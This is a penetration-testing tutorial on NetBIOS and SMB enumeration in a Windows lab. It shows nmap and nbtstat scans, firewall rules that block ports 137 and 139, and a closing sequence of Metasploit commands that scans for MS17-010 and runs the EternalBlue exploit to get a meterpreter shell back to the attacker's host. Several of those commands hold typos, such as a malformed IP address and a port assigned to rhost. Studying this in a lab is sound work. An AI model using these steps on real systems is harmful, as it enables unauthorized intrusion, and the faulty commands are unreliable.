@@ -1,0 +1,88 @@
+
+NetBIOS and SMB Penetration Testing on Windows
+
+From Wikipedia
+NETBIOS (Network Basic Input/output System)
+NETBIOS is a service which allows communication between applications such as printer or other computer in Ethernet or token ring network via NETBIOS name.
+NETBIOS name is 16 digits long character assign to a computer in workgroup by WINS for name resolution of an IP address into NETBIOS name.
+Workgroup VS Domain
+Workgroup: It is a peer to peer network for maximum 10 computers in same LAN or subnet. It has no Centralized Administration, which means no computer has control over another computer. Each user controls the resources and security locally on their system.
+Domain: It is a client/server network for up to 2000 computers anywhere in the world. The administrator manages the domain and its users and resources. A user with an account on the domain can log onto any computer system, without having the account on that computer.
+NetBIOS provides three distinct services:
+Port 135: it is used for Microsoft Remote Procedure Call between client and server to listen the query of client. Basically it is used for communication between client- client and server -client for sending messages.
+Port 137: the name service operates on UDP port 137. The name service primitives offered by NetBIOS are:
+Port 138: Datagram mode is connectionless; the application is responsible for error detection and recovery. In NBT, the datagram service runs on UDP port 138.The datagram service primitives offered by NetBIOS are:
+Port 139: Session mode lets two computers establish a connection, allows messages to span multiple packets, and provides error detection and recovery. In NBT, the session service runs on TCP port 139.
+The session service primitives offered by NetBIOS are:
+Port 445: It is used for SMB protocol (server message block) for sharing file between different operating system i.e. windows-windows, Unix-Unix and Unix-windows.
+For mail details read our previous article given below:-
+Scanning open port for NETBIOS Enumeration
+We are using nmap for scanning target network for open TCP and UDP ports and protocol.
+nmap -sT -sU 192.168.1.128
+From given image you can see that from result of scan we found port 137 is open for NetBIOS name services, moreover got MAC address of target system.
+
+What will happen if admin has shares a folder in a network? 
+Suppose we had given share permission to a specific folder (for example ignite as shown in given image) so that we can share that folder with other user in local network then which port will involve in this process.
+
+Now you can observe that we have got a link for our share folder. Using that link anyone can access this folder in that network, hence it means now a new port must be activated for establish connection in order to access share folder on another system, let find out it.
+
+Now again taking the help of nmap for scanning the target one more time.
+nmap -sT -sU 192.168.1.128
+From result of scanning you can observe that after sharing a folder we found port 135, 139 and 445 get activated.
+Hence only by sharing a single folder in network, three ports get opened simultaneously in target system for communication with other system.
+
+Through computer > properties, user can view basic information about their computer.
+As you can perceive we are sharing the image of victims control panel home which is showing his system basic information such as computer name, workgroup and etc.
+
+Same information can be enumerated with another system in that network using following command:
+nbtstat -a 192.168.1.128
+Hence you can read the information from inside NetBIOS remote machine name table we had enumerated same information as shown in above image.
+
+ 
+Apply filter on port 135-139 with firewall
+For increasing security of your system in your local network you can add filter on port 137 with help of window firewall. Because port series from 135 to 139 are most vulnerable therefore administrator can block either whole series or specific port.
+Select Inbound Rules and click on New Rule.
+
+Select radio button for port which will create a new rule that control connections for a TCP or UDO port.
+Then click on next.
+
+Select UDP port to apply rule on it.
+Edit port 137 as specific local port then click on next. Here you can add complete series also for example: 135,137,138,139.
+
+Choose Block the connection as action to be taken when a connection matches the specified condition.
+Hence it will not allow traffic on port 137 for communication as a result if attacker will scan victim system he will not able to find the NetBIOS name of target system.
+Click on next.
+
+At last provide caption to your new rule of your choice (as show in image block nbtsat) and then click on Finish and you will see the new will be added into window firewall.
+
+Now scan target system using previous command
+nbtstat -a 192.168.1.128
+This time it will not give any information related to NetBIOS. Form given image you can read the message “Host is not found.
+Conclusion: Hence by blocking 137 admin has added a security level that will hide NetBIOS name of his system (192.168.1.128) in local network.
+
+Now let’s try to access share folder of target (192.168.1.128) using run command prompt. From given image you can observe that we are able to access to ignite folder. It is possible due to service “NetBIOS session service” running on port 139. 
+
+Block port 139
+Similarly again use firewall inbound rule to block port 139, so that we can verify its impact on sharing information between two or more system. This will add a new in firewall to stop the traffic coming on port 139.
+
+Now again  let’s try to access share folder of target (192.168.1.128)when port 139 is blocked by him and figure out whether we can able to access the share folder “ignite” or not, using run command prompt.
+From given image you can see that we are able to access to ignite folder when the port 139 has been blocked by admin in his network.
+Conclusion: Although port 139 was blocked but still sharing was possible due to running protocol on port 445. Hence by blocking port 137 and 139 admin has added a security level that will prevent NetBIOS session service as well as NetBIOS name service for NetBIOS enumeration.
+
+Mainly in many origination port serious from 135 to139 are blocked in network for security reasons, therefore port 445 is used for sharing data in network.  Now identify whether it is vulnerable to MS17-010 using metasploit as show in given image.
+Use auxiliary/scanner/smb/smb_ms17_010
+msf auxiliary(smb_ms17_010) > set rhosts 192.168.1.28
+msf auxiliary(smb_ms17_010) > set port 445
+msf auxiliary(smb_ms17_010) >  exploit
+From result we found host is vulnerable to MS17-010, hence we can exploit the target easily.
+For more scanning method read our previous article from here.
+
+use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(ms17_010_eternalblue) >set rhost 192.168.1.1.128
+msf exploit(ms17_010_eternalblue) >set rhost 445
+msf exploit(ms17_010_eternalblue) >set lhost 192.168.1.115
+msf exploit(ms17_010_eternalblue) > exploit
+This will exploit target system and give meterpreter session of targeted system as shown in given image.
+Conclusion: Enumeration plays an important role in network penetration testing because it will fetch out hidden information of victim’s system as well as identify the weakness that may help in exploiting the system.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
